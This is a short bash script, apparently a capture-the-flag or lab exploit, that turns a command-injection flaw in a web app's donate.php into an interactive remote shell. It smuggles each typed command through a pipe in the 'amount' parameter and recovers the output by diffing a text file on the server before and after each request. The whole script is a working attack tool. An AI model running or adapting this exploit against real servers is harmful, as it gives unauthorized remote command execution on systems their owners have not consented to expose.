#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
    read -rp '$ ' raw_cmd
    if [[ -n "${raw_cmd}" && "${raw_cmd}" = "custom" ]]; then
        cat cmd_all.txt 2>/dev/null
        continue
    fi

    command=$(printf %s "${raw_cmd}" | jq -sRr @uri)

    prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

    curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"


    new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

    delta=$(diff --new-line-format="%L" \
                        --unchanged-line-format="" \
                        <(echo "${prev_resp}") <(echo "${new_resp}"))

    echo "${delta}" >> cmd_all.txt

    echo "${delta}"
done
